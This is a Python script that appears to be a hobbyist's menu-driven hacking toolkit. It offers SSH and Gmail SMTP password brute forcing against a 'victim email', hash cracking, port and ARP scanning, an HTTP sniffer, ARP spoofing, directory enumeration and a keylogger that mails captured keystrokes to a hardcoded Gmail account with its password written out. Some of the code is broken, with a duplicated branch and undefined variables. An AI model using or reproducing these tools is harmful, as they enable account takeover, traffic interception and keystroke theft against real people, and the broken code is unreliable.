import os
import requests
import sys
import socket
import time
from threading import Timer

#os.system("apt-get install lolcat")
print("""\033[1;32m
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
         
 $$$$$$\                  $$\                           $$$$$$$\                  $$$$$$$$\ $$\                $$$$$\ $$\ $$\                       $$\       $$\     $$\                                                  $$$$$$\  
$$  __$$\                 $$ |                          $$  __$$\                 $$  _____|$$ |               \__$$ |\__|$$ |                      $$ |      \$$\   $$  |                                                $$  __$$\ 
$$ /  \__| $$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\        $$ |  $$ |$$\   $$\       $$ |      $$ |                  $$ |$$\ $$$$$$$\   $$$$$$\   $$$$$$$ |       \$$\ $$  /$$$$$$\  $$\   $$\  $$$$$$$\  $$$$$$$\  $$$$$$\  $$ /  \__|
$$ |      $$  __$$\ $$  __$$ |$$  __$$\ $$  __$$\       $$$$$$$\ |$$ |  $$ |      $$$$$\    $$ |                  $$ |$$ |$$  __$$\  \____$$\ $$  __$$ |        \$$$$  /$$  __$$\ $$ |  $$ |$$  _____|$$  _____|$$  __$$\ $$$$\     
$$ |      $$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|      $$  __$$\ $$ |  $$ |      $$  __|   $$ |            $$\   $$ |$$ |$$ |  $$ | $$$$$$$ |$$ /  $$ |         \$$  / $$ /  $$ |$$ |  $$ |\$$$$$$\  \$$$$$$\  $$$$$$$$ |$$  _|    
$$ |  $$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |            $$ |  $$ |$$ |  $$ |      $$ |      $$ |            $$ |  $$ |$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |          $$ |  $$ |  $$ |$$ |  $$ | \____$$\  \____$$\ $$   ____|$$ |      
\$$$$$$  |\$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ |            $$$$$$$  |\$$$$$$$ |      $$$$$$$$\ $$$$$$$$\       \$$$$$$  |$$ |$$ |  $$ |\$$$$$$$ |\$$$$$$$ |          $$ |  \$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ $$ |      
 \______/  \______/  \_______| \_______|\__|            \_______/  \____$$ |      \________|\________|       \______/ \__|\__|  \__| \_______| \_______|          \__|   \______/  \______/ \_______/ \_______/  \_______|\__|      
                                                                  $$\   $$ |                                                                                                                                                        
                                                                  \$$$$$$  |                                                                                                                                                        
                                                                   \______/                                                                                                                                                         
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                                                                                                
\033[1;37m""")
def timer():
    t = Timer(10,timer)
    t.start()
print("")
user=str(input("🎀  𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝒏𝒂𝒎𝒆  🎀  : "))
print("")
print("\033[1;31m============================================================================================================================================================================================================================================")
print("\033[1;31m/////////////////////////////////////////////////////// 𝒘𝒆𝒍𝒄𝒐𝒎𝒆 {0} 𝑰 𝒂𝒎 𝒏𝒐𝒕 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒊𝒃𝒍𝒆 𝒇𝒐𝒓 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒊𝒔 𝒔𝒄𝒓𝒊𝒑𝒕 𝒇𝒐𝒓 𝒎𝒂𝒍𝒊𝒄𝒊𝒐𝒖𝒔 𝒑𝒖𝒓𝒑𝒐𝒔𝒆𝒔  //////////////////////////////////////////////////////////////////////////////////////////////".format(user))
print("============================================================================================================================================================================================================================================")
print("\033[1;31m////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////")
print("============================================================================================================================================================================================================================================")
print("\033[1;37m]")
print("=============================================================== 𝖒𝖞 𝖈𝖍𝖆𝖓𝖓𝖆𝖑 𝖑𝖎𝖓𝖐     :      https://www.youtube.com/channel/UCp11N9Fj79c40n_kHAOfL1Q ===============================================================================")
print("")
print("(1)  -    𝓑𝓻𝓾𝓽𝓮 𝓕𝓸𝓻𝓬𝓮 𝓢𝓢𝓗                     ")
print("______________________________________________")
print("(2)  -    𝓒𝓻𝓪𝓬𝓴𝓮𝓭 𝓗𝓪𝓼𝓱                    ")
print("______________________________________________")
print("(3)  -    𝒈𝒆𝒕 𝒑𝒐𝒓𝒕 𝒐𝒇 𝒔𝒆𝒓𝒗𝒊𝒄𝒆                  ")
print("______________________________________________")
print("(4)  -    𝒈𝒆𝒕 𝒔𝒆𝒓𝒗𝒊𝒄𝒆 𝒐𝒇 𝒑𝒐𝒓𝒕                 ")
print("______________________________________________")
print("(5)  -    𝒔𝒄𝒂𝒏 𝒑𝒐𝒓𝒕𝒔                          ")
print("______________________________________________")
print("(6)  -    𝒔𝒄𝒂𝒏 𝒊𝒑 𝒂𝒏𝒅 𝒎𝒂𝒄 𝒐𝒇 𝒚𝒐𝒖𝒓 𝒏𝒆𝒕𝒘𝒐𝒓𝒌   ")
print("______________________________________________")
print("(7)  -    𝒔𝒄𝒂𝒏 𝒑𝒐𝒓𝒕𝒔 𝒐𝒏 𝒍𝒊𝒏𝒖𝒙                 ")
print("______________________________________________")
print("(8)  -    𝙎𝙣𝙞𝙛𝙛𝙚𝙧 𝙉𝙚𝙩𝙬𝙤𝙧𝙠  𝙃𝙩𝙩𝙥            ")
print("_____________________________________________")
print("(9)  -    𝘼𝙧𝙥 𝙎𝙥𝙤𝙤𝙛𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠                 ")
print("____________________________________________")
print("(10) -    𝒌𝒆𝒚𝒍𝒐𝒈𝒈𝒆𝒓                         ")
print("____________________________________________")
print("(11) -  𝑬𝒏𝒖𝒎𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝑹𝒆𝒑𝒆𝒓𝒕𝒐𝒊𝒓𝒆          ")
print("")
print("____________________________________________________________________________________________________________________________________________________________________________________________________________________________________")
print("")
def menu():
       choise = str(input("𝐄𝐧𝐭𝐞𝐫 𝐘𝐨𝐮𝐫 𝐂𝐡𝐨𝐢𝐬𝐞 ======================<> : "))
       if choise == "1" :
                 import paramiko
                 import sys
                 import os
                 target = str(input('Enter Target IP Address: '))
                 print("")
                 username = str(input('Enter Username To Bruteforce: '))
                 print("")
                 password_file = str(input('Enter Location Of The Password File: '))

                 def ssh_connect(password,code=0):
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     
                     try:
                         ssh.connect(target, port=22, username=username, password=password)
                     except paramiko.AuthenticationException:
                         code = 1
                     ssh.close()
                     return code

                 with open(password_file, 'r') as file:
                      for line in file.readlines():
                          password = line.rstrip('\n')
	
                          try:
                              response = ssh_connect(password)

                              if response == 0:
                                 print('\033[1;32mPassword Found ===========================> {+} : '+ password)
                                 exit(0)
                              elif response == 1: 
                                   print('\033[1;32mPassword Not Found =====================> {-}: '+ password)
                          except Exception as e:
                              print(e)
                          pass

                 input_file.close()

       elif choise == "2":
                   import hashlib
                   print("")
                   has = input("𝔼𝕟𝕥𝕖𝕣 𝕐𝕠𝕦𝕣 ℍ𝕒𝕤𝕙 𝕐𝕠𝕦 𝕎𝕒𝕟𝕥 𝕋𝕠 ℂ𝕣𝕒𝕔𝕜 : ")
                   TYPE_HASH = input("Enter Your Hash Type: ")
                   print("")
                   listt = input("𝔼𝕟𝕥𝕖𝕣 𝕐𝕠𝕦𝕣 ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕 𝕃𝕚𝕤𝕥: ")
                   print("")
                   lis = open(listt ,'r')
                   for v in lis:
                       EN = v.strip()
                       text = EN.encode("UTF-8")
                       HASH_HASH = hashlib.new(TYPE_HASH)
                       HASH_HASH.update(text)
                       Compare = HASH_HASH.hexdigest()
                      
                       if Compare == has:
                          print ("\033[1;32mʏᴏᴜʀ ʜᴀꜱʜ ɪꜱ ꜰᴏᴜɴᴅ ====================================================> [+] " , text.decode("UTF-8"))
                          print("")
                          break;   
                       if Compare != has:
                          print ("ʏᴏᴜʀ ʜᴀꜱʜ ɪꜱ ɴᴏᴛ ꜰᴏᴜɴᴅ ========> [-] " , text.decode("UTF-8"))
                          
       elif choise == "3":
                   import smtplib
                   SmtpServer = smtplib.SMTP("smtp.gmail.com",587)
                   SmtpServer.ehlo()
                   SmtpServer.starttls()
                   print("")


                   USER = str(input("𝓔𝓷𝓽𝓮𝓻 𝓨𝓸𝓾𝓻  𝓥𝓲𝓬𝓽𝓲𝓶 𝓔𝓶𝓪𝓲𝓵: "))
                   print("")
                   PASSWORD_LIST = str(input("𝓔𝓷𝓽𝓮𝓻 𝓨𝓸𝓾𝓻 𝓟𝓪𝓼𝓼𝔀𝓸𝓻𝓭 𝓛𝓲𝓼𝓽: "))
                   print("")
                   PASSLIST_OPEN  = open(PASSWORD_LIST,'r')
                   for password in PASSLIST_OPEN:
                       try:
                            SmtpServer.login(USER,password)
                            print("\033[1;32m𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 𝙁𝙤𝙪𝙣𝙙 ===================================================> [+] ", password)
                       except smtplib.SMTPAuthenticationError:
                            print("\033[1;32m𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱 ===================> [-]  ", password)          


       elif choise == "4":
       elif choise == "4":
                   import socket
                   port=int(input("ᴇɴᴛᴇʀ ᴘᴏʀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇᴛ :"))
                   service_name  = socket.getservbyport(port)
                   print(service_name)          
       elif choise == "5":
                   import socket
                   target= str(input("\033[1;32mEnter IP You Want To Scan =========================================> :"))
                   IP = int(input("\033[1;32mEnter Port You Want To Scan ==========================================> :"))
                   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   s.settimeout(3)
                   r = s.connect_ex((target,IP))
                   if r == 0 :
                       service = socket.getservbyport(p)
                       print("\033[1;32m [ ^ {} ^ Port Is Open ===================================================> {} ]".format(p,service))
                   s.close()
       elif choise == "6":
                   from scapy.all import ARP , Ether , srp
                   import sys
                   def scan(ip):
                        while True :
                       
                             arp_req = ARP(pdst=ip) 
                             brodcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
                             arp_brodcast = brodcast/arp_req
                             result = srp(arp_brodcast,timeout=3,verbose=False)[0]
                             print(result)
                             lst = []
                             for element in result:
                                         clients = {"ip":element[1].psrc,"mac":element[1].hwsrc}
                                         lst.append(clients)
                             print("IP \t\t\t\t MAC")
                             print("_____________________________________________________")
                             for i in lst :    
                                         print("{} \t\t\t\t {} \n ".format(i['ip'],i['mac']))
                   ip = str(input("Eｎｔｅｒ Ｒａｎｇｅ Ｉｐ ===================> :"))
                   scan(ip)

       elif choise == "7":
                   import socket
                   from typing import SupportsIndex
                   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   host=str(input("Enter Ip =============> :"))
                   port =int(input("Enter Port ==========> :"))
                   if sock.connect_ex((host,port)):
                             print("Port %d Is Closed "%port)
                   else:
                       print("Port %d Is Open"%port)
       elif choise == "8":
                   print("==========================================")
                   ENTER =input("Sniff HTTP Only Website Press Enter :")
                   import os
                   os.system("python3 -m pip install scapy")
                   import scapy.all as scapy
                   from scapy.layers import http
                   def sniffer(interface):
                       print("_______________________________________")
                       print("[+] *    𝕊𝕟𝕚𝕗𝕗𝕖𝕣 𝕊𝕥𝕒𝕣𝕥...: ") 
                       print("_______________________________________")
                       scapy.sniff(iface=interface, store=False, prn=process)
                   def process(packet):
                       if packet.haslayer(http.HTTPRequest):
                            print("[+] ",packet[http.HTTPRequest].Host)
                            if packet.haslayer(scapy.Raw):
                               request = packet[scapy.Raw].load
                               print("==========> ",request)
                   sniffer("eth0")
       elif choise == "9":
                   import scapy.all as scapy
                   import time
                   import sys
                   import os
                   os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                   def get_mac(ip):
                              arp_packet = scapy.ARP(pdst=ip)
                              broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                              arp_broadcast_packet = broadcast_packet/arp_packet
                              answered_list = scapy.srp(arp_broascast_packet, timeout=1, verbose=False)[0]
                              return answered_list[0][1].hwsrc

                   def spoof(target_ip, spoof_ip):
                              target_mac = get_mac(target_ip)
                              packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
                              scapy.send(packet, verbose=False)
                              print("")
                   target= str(input("Enter The Target IP : "))
                   spoofed = str(input("Enter IP You Want Spoof : "))
                   try:
                       while True:
                          spoof(target,spoofed)
                          spoof(spoofed,target)
                          print("[+] 𝐏𝐚𝐜𝐤𝐞𝐭𝐬 𝐈𝐬 𝐒𝐞𝐧𝐭 𝐰𝐢𝐭𝐡 𝐬𝐮𝐜𝐜𝐞𝐬𝐬 ...")
                          time.sleep(8)
                   except KeyboardInterrupt:
                             print("{ exit...bye )}")
                             sys.exit()                              
       elif choise == "10":
                   import os
                   os.system("python3 -m pip install pynput")
                   from pynput.keyboard import Key , Listener
                   from threading import Timer
                   def key_pressed(key):
                          try:
                              press = str(key.char)
                          except:
                              if key == key.space:
                                    log=""
                              else:
                                    press=str(key)
                          print(press)
                          f = open("setting.txt",'a')
                          f.write(press)
                          f.close()
                   from smtplib import SMTP
                   def send_email(email, password, msg):
                          
                            mailer = SMTP('smtp.gmail.com',587)
                            mailer.ehlo()
                            mailer.starttls()
                            mailer.login(email,password)
                            mailer.sendmail(email, email ,msg)
                            mailer.quit()
                   from threading import Timer                 
                   def timer():
                            t = Timer(30,timer)
                            t.start()
                            
                            try:
                                f = open("setting.txt","r")
                                logs= f.read()
                                send_email("eljihad380@gmail.com","azertyuiop123456789",logs)
                                os.remove("Setting.txt")
                            except:
                                 nothing=""
                   with Listener(on_press=key_pressed) as l :
                                 timer()
                                 l.join()
                                 c=input("enter to exit:")   
                   timer()
                   l.join()
       elif choise == "11": 
                     import time 
                     print("")                                 			     
                     USER = input('Enter Your Password_List ==================> : ')
                     print("")
                     IP = input('Enter Ip You Want To Scan ===========================> : ')	
                     print('')
                     time.sleep(2)
                     sub_list = open(USER).read() 
                     directories = sub_list.splitlines()
                     for dir in directories:
                         dir_enum = f"http://{IP}/{dir}"
                         r = requests.get(dir_enum)
                         if r.status_code==404:               
                            pass   				      
                         else:
                              print("\033[1;32mValid directory:" ,dir_enum,"===============> Code 200")	  
		  
menu()
